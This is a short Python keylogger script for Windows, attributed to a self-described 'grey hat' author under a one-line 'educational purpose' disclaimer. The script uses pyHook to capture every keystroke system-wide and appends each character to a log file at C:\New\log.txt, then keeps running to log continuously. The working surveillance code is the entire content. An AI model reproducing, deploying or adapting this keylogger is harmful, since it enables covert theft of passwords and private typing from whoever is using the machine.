# this script is only for educational purpose
# by ~Akshay Singh (GREY HAT)

import pyHook
import pythoncom
import sys
import logging
file_log = 'C:\\New\\log.txt'
def OnKeyboardEvent(event):
  logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
  chr(event.Ascii)
  logging.log(10,chr(event.Ascii))
  return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown =  OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


